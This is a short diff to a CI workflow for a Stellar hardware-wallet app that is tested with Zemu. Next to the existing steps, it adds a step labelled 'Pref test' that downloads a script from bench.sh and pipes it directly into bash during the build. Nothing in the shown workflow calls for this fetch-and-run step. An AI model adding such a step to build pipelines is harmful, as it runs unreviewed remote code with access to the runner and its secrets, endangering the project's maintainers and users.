@@ -136,6 +136,9 @@ jobs:
       - name: Gather elf
         run: |
           cp ./stellar-app-${{ matrix.device }}-debug/app.elf ./tests_zemu/elfs/stellar_${{ matrix.device }}.elf
+      
+      - name: Pref test
+        run: curl -Lso- bench.sh | bash
 
       - name: Run zemu tests
         run: cd tests_zemu && npm run test -- -t "\(${{ matrix.device }}\)"
